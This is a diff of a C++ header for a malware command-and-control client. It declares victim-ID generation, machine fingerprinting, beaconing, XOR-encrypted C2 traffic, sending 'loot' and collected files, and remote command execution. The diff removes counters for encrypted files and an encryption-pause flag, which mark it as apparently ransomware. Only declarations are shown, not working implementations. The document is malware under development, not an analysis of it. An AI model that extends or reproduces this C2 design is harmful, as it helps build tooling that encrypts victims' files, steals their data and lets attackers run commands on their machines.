@@ -42,16 +42,9 @@ private:
     int beacon_interval_seconds;
     int max_retries;
     std::string current_exe;
-    int encrypted_count = 0;
-    int failed_count = 0;
-    time_t start_time = 0;
-    bool pause_encryption_flag = false;
-
-
-    // Callbacks
+    
     std::function<void(const std::string&)> on_execute_command;
     
-    // Helper functions
     std::string generate_victim_id();
     std::string get_machine_info();
     std::string url_encode(const std::string& value);
@@ -59,12 +52,8 @@ private:
     std::string base64_decode(const std::string& encoded);
     std::string create_json(const std::map<std::string, std::string>& data);
     bool parse_json(const std::string& json, std::map<std::string, std::string>& output);
-    
-    // HTTP request methods
     bool http_post(const std::string& url, const std::string& data, std::string& response);
     bool http_get(const std::string& url, std::string& response);
-    
-    // Encryption for C2 traffic
     std::string xor_encrypt(const std::string& payload);
     std::string xor_decrypt(const std::string& payload);
     
@@ -83,15 +72,11 @@ public:
     void send_collected_files(const std::string& zip_path);
     void send_loot(const std::string& loot_type, const std::string& loot_data);
     void send_file(const std::string& file_path, const std::string& file_type);
-    
     void set_command_callback(std::function<void(const std::string&)> callback);
     void poll_commands();
-    void execute_command(const std::string& command, const std::map<std::string, std::string>& params = {});
-    void set_current_exe(const std::string& exe_path) { current_exe = exe_path;
-
-
-    bool is_connected() const;
-    std::string get_victim_id() const { return victim_id; }
+    void set_current_exe(const std::string& exe_path) { current_exe = exe_path; }
+    bool is_connected();
+    std::string get_victim_id() { return victim_id; }
 };
 
-#endif // C2_COMMUNICATION_H
+#endif
